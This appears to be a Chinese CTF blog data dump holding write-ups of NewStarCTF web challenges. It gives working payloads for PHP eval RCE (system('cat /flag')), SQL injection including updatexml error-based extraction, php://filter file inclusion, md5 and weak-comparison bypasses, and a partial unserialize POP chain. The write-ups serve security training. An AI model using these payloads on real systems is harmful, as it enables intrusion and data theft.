href=\"https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7\" >md5绕过<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>当我们让key1和key2为数组的时候，md5加密后，结果均为0，则0&#x3D;&#x3D;&#x3D;0成立</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key1[]=<span class=\"number\">1</span>&amp;key2[]=<span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<p>第三关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)</span><br></pre></td></tr></table></figure>\n\n<p>is_numeric函数用来判断是否为数字</p>\n<p>intval() 函数用于获取变量的整数值。</p>\n<p>这里我们需要让num不是数字但让num&#x3D;2077，这里需要注意这里用到的是&#x3D;&#x3D;</p>\n<p>这是弱类型比较，则我们传入num&#x3D;2077a</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num=<span class=\"number\">2077</span>a</span><br></pre></td></tr></table></figure>\n\n<p>intval(2077a)&#x3D;2077可以在自己实验一下</p>\n<p>第四关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>简单的rce，难点在于这个#注释</p>\n<p>有两种绕过方式</p>\n<p>1.?&gt;让前面闭合</p>\n<p>2.%0a用换行来绕过</p>\n<p>经测试发现空格被过滤 我这利用%20绕过，还有许多绕过方式，自行搜索</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;cmd=%<span class=\"number\">0</span>asystem(<span class=\"string\">&#x27;cat%20/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;cmd=<span class=\"meta\">?&gt;</span><span class=\"meta\">&lt;?</span><span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;cat%20/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>得到flag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}</p>\n<h1 id=\"5-Word-For-You\"><a href=\"#5-Word-For-You\" class=\"headerlink\" title=\"5.Word-For-You\"></a>5.Word-For-You</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png\"\n                        alt=\"图片-1665405676352\"\n                 ></p>\n<p>看着像sql注入猜一波万能密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png\"\n                        alt=\"图片-1665405683499\"\n                 ></p>\n<p>直接出，这里给一个sql注入学习链接</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142%5Ev50%5Epc_rank_34_1,201%5Ev3%5Eadd_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187\" >sql注入<i class=\"fas fa-external-link-alt\"></i></a></p>\n<br/>\n\n<br/>\n\n<p>第一周做完了，题目还算比较简单，这段时间充实下自己吧</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"1-HTTP\"><a href=\"#1-HTTP\" class=\"headerlink\" title=\"1.HTTP\"></a>1.HTTP</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png\"\n                        alt=\"图片-1665405504740\"\n                 ></p>\n<p>进入题目发现要get name，我们猜测要用get的提交数据方式传一个值</p>\n<p>get传值公式为</p>\n<p><strong>?+变量名+等于号（&#x3D;）+变量值</strong></p>\n<p>题目中的“name”添加了单引号，猜测变量名为name传入</p>\n<p>?name&#x3D;1</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png\"\n                        alt=\"图片-1665405531405\"\n                 ></p>\n<p>进入第二关，需要我们post一个key值，但我们不知道key</p>\n<p>F12进入开发者模式，html中藏了key值</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png\"\n                        alt=\"图片-1665405550865\"\n                 ></p>\n<p>用post传参key&#x3D;ctfisgood（post传参不会显示到url上面，并且并不需要用问号（？）</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png\"\n                        alt=\"图片-1665405558353\"\n                 ></p>\n<p>用bp传入key&#x3D;ctfisgood后，发现response说我们不是admin，</p>\n<p>我们看到cookie中显示user&#x3D;guest，改为user&#x3D;admin</p>\n<p>得到flag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}</p>\n<h1 id=\"2-Head-Header\"><a href=\"#2-Head-Header\" class=\"headerlink\" title=\"2.Head?Header!\"></a>2.Head?Header!</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png\"\n                        alt=\"图片-1665405589688\"\n                 ></p>\n<p>这里要我们将浏览器改为CTF，我们用bp抓一个包</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png\"\n                        alt=\"图片-1665405599681\"\n                 ></p>\n<p>必须要求我们来自‘ctf.com’，这里用到了referer的知识点</p>\n<blockquote>\n<p>Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在<a class=\"link\"   href=\"http://www.google.com/\" >www.google.com<i class=\"fas fa-external-link-alt\"></i></a> 里有一个<a class=\"link\"   href=\"http://www.baidu.com/\" >www.baidu.com<i class=\"fas fa-external-link-alt\"></i></a> 链接，那么点击这个<a class=\"link\"   href=\"http://www.baidu.com/\" >www.baidu.com<i class=\"fas fa-external-link-alt\"></i></a> ，它的header 信息里就有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer=http://www.google.com</span><br></pre></td></tr></table></figure>\n\n<p>由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer  信息。</p>\n</blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/shenqueying/article/details/79426884\" >referer知识点<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>我们加一行</p>\n<p><strong>referer:ctf.com</strong></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png\"\n                        alt=\"图片-1665405614966\"\n                 ></p>\n<p>这里提示我们不是local，在php中有很多头能改来源常见的是X-Forward-For</p>\n<p><a class=\"link\"   href=\"https://www.jianshu.com/p/15f3498a7fad\" >X-Forwarded-For知识点<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>我们添加一行</p>\n<p><strong>X-Fordward-For:127.0.0.1</strong></p>\n<p>127.0.0.1就是本地地址</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png\"\n                        alt=\"图片-1665405624087\"\n                 ></p>\n<p>得到flag{d0637815-c4fc-4aa4-a842-06ebfc22817b}</p>\n<h1 id=\"3-我真的会谢\"><a href=\"#3-我真的会谢\" class=\"headerlink\" title=\"3.我真的会谢\"></a>3.我真的会谢</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png\"\n                        alt=\"图片-1665405631706\"\n                 ></p>\n<p>flag放在三个地方，都是敏感文件</p>\n<p>一般常见的有</p>\n<p>robots.txt .index.php.swp <a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a> index.php~ 还有很多可以自行查询</p>\n<p>题目这里是robots.txt .index.php.swp <a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png\"\n                        alt=\"图片-1665405645261\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png\"\n                        alt=\"图片-1665405650443\"\n                 ><br><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png\"\n                        alt=\"图片-1665405656120\"\n                 ></p>\n<p>得到flag</p>\n<p>正常情况下我们用dirsearch就可以扫出来，不过buu这里不支持</p>\n<h1 id=\"4-NotPHP\"><a href=\"#4-NotPHP\" class=\"headerlink\" title=\"4.NotPHP\"></a>4.NotPHP</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hack Me&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Number error!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Wrong Key!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Pass it!&quot;</span>);</span><br><span class=\"line\">&#125; Pass it!</span><br></pre></td></tr></table></figure>\n\n<p>是一道php代码审计题目一共有四关</p>\n<p>第一关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">&quot;Welcome to CTF&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>这里给出相关知识点<a class=\"link\"   href=\"https://blog.csdn.net/qq_45290991/article/details/113852174\" >file_get_contents相关知识点<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/linfangnan/p/13535097.html\" >php伪协议<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>这里我们用data协议写入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?data=data:<span class=\"comment\">//text/plain,Welcome to CTF</span></span><br></pre></td></tr></table></figure>\n\n<p>接着第二关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">要求我们<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>\n\n<p>这里要求key1和key2的md5值相同但key1和key2不相等，乍一看觉得很奇怪，但其实md5可以绕过</p>\n<p><a class=\"link\"   href=\"https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7\" >md5绕过<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>当我们让key1和key2为数组的时候，md5加密后，结果均为0，则0&#x3D;&#x3D;&#x3D;0成立</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key1[]=<span class=\"number\">1</span>&amp;key2[]=<span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<p>第三关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)</span><br></pre></td></tr></table></figure>\n\n<p>is_numeric函数用来判断是否为数字</p>\n<p>intval() 函数用于获取变量的整数值。</p>\n<p>这里我们需要让num不是数字但让num&#x3D;2077，这里需要注意这里用到的是&#x3D;&#x3D;</p>\n<p>这是弱类型比较，则我们传入num&#x3D;2077a</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num=<span class=\"number\">2077</span>a</span><br></pre></td></tr></table></figure>\n\n<p>intval(2077a)&#x3D;2077可以在自己实验一下</p>\n<p>第四关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>简单的rce，难点在于这个#注释</p>\n<p>有两种绕过方式</p>\n<p>1.?&gt;让前面闭合</p>\n<p>2.%0a用换行来绕过</p>\n<p>经测试发现空格被过滤 我这利用%20绕过，还有许多绕过方式，自行搜索</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;cmd=%<span class=\"number\">0</span>asystem(<span class=\"string\">&#x27;cat%20/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;cmd=<span class=\"meta\">?&gt;</span><span class=\"meta\">&lt;?</span><span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;cat%20/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>得到flag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}</p>\n<h1 id=\"5-Word-For-You\"><a href=\"#5-Word-For-You\" class=\"headerlink\" title=\"5.Word-For-You\"></a>5.Word-For-You</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png\"\n                        alt=\"图片-1665405676352\"\n                 ></p>\n<p>看着像sql注入猜一波万能密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png\"\n                        alt=\"图片-1665405683499\"\n                 ></p>\n<p>直接出，这里给一个sql注入学习链接</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142%5Ev50%5Epc_rank_34_1,201%5Ev3%5Eadd_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187\" >sql注入<i class=\"fas fa-external-link-alt\"></i></a></p>\n<br/>\n\n<br/>\n\n<p>第一周做完了，题目还算比较简单，这段时间充实下自己吧</p>\n"},{"title":"NewStarCTF WEEK2 WEB","date":"2022-10-10T15:11:51.000Z","excerpt":"NewStarCTF WEEK2 WEB","_content":"\n\n\n# NewStarCTF WEEK2 WEB\n\n## 1.Word-For-You(2 Gen)\n\n\n首先我们来试一下万能密码\n\n\n\n```sql\n1' or 1=1#\n```\n\n![图片-1665405773483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png)\n\n发现没有什么用，我们尝试一下报错注入\n\n![图片-1665405782381](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png)\n\n这里爆出了库名~wfy，说明我们可以利用报错注入，接着我们爆列表\n\n这里一共爆了三个列表\n\n```sql\nXPATH syntax error: '~wfy_admin,wfy_comments,wfy_info'    \n```\n\n这里我们都试了一遍，发现flag在wfy_comments里面，我们查一下里面\n\n```sql\n1’||updatexml(1,concat(0x7e,(select reverse(group_concat(text)) from wfy_comments)),1)#\n```\n\n```sql\nXPATH syntax error: '~}sr0rre_emos_ek2m_t4uJ{galf,难'    //得到逆序flag\n```\n\n\n\n## 2.IncludeOne\n\n题目源代码：\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);//设置随机数种子\necho \"Hint: \".mt_rand().\"<br>\";//已知第一个随机数种子为：1219893521\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){//md5强类型\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) &&//过滤base preg_match(\"/NewStar/i\",$_GET['file']) && isset($_GET['file'])){\n       //要求存在NewStar字符串，并且有file参数\n        //flag in `flag.php`\n        include($_GET['file']);//文件包含漏洞\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!\n```\n\n题目这里给了一个链接：https://www.openwall.com/php_mt_seed/\n\n这里大概讲的就是随机数种子的漏洞\n\n当我们知道随机数种子后，后面的随机数无论在哪里运行都是有可预见性的\n\n```php\n<?php  \nmt_srand(12345);    \necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\n?>    \n162946439\n\n247161732\n\n1463094264\n\n1878061366\n\n394962642\n```\n\n当随机数种子设置成12345时，前五个随机数都是一样的，于是这个题目就有了思路，我们已知第一个随机数，可以用工具爆破出种子，然后我们用种子读第二个随机数，然后文件读取\n\n![图片-1665405798622](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png)\n\n这里爆出随机数种子为1145146\n\n我们用种子去跑第二个随机数：1202031004\n\n然后post传值\n\n接着就是文件包含，这题过滤了base我们可以用rot13编码（编码的形式有许多种）\n\n```php\n?file=php://filter/read=string.rot13/resource=flag.php\n```\n\n我发现这题必须要包含NewStar这个字符串，于是我们改成\n\n```php\n?file=php://filter/NewStar/read=string.rot13/resource=flag.php\n```\n\n```\nsynt{p1786p1p-rqr8-4524-n796-r3s84050oo92}\n```\n\nrot13解码得\n\n```\nflag{c1786c1c-ede8-4524-a796-e3f84050bb92}\n```\n\n## 3.UnserializeOne\n\n源代码：\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    protected $func;\n\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    private $obj;\n    private $var;\n\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n\n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n\nif(isset($_POST['pop'])){\n    unserialize($_POST['pop']);\n}\n\n```\n\n这个题目是考反序列化，利用点为\n\n```php\n echo file_get_contents('/flag');\n```\n\n- [x] __construct()，类的构造函数\n- __destruct()，类的析构函数\n- __call()，在对象中调用一个不可访问方法时调用\n- __callStatic()，用静态方式中调用一个不可访问方法时调用\n- __get()，获得一个类的成员变量时调用\n- __set()，设置一个类的成员变量时调用\n- __isset()，当对不可访问属性调用isset()或empty()时调用\n- __unset()，当对不可访问属性调用unset()时被调用。\n- __sleep()，执行serialize()时，先会调用这个函数\n- __wakeup()，执行unserialize()时，先会调用这个函数\n- __toString()，类被当成字符串时的回应方法\n- __invoke()，调用函数的方式调用一个对象时的回应方法\n- __set_state()，调用var_export()导出类时，此静态方法会被调用。\n- __clone()，当对象复制完成时调用\n- __autoload()，尝试加载未定义的类\n- __debugInfo()，打印所需调试信息\n\n这题目找pop链，一般我从**__destruct**开始，链终点是Sec类中的**__invoke**\n\n```php\npublic function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n```\n\n如果我们将这里的name改成类，由于echo会将类当成字符串可以触发**__tostring**\n\n我们将Start类中的name设置为Sec类\n\n```php\npublic function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n```\n\n由于这里的check方法没有被定义则会触发**__call**\n\n我们将Sec中的obj设置为Easy类\n\n```php\npublic function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    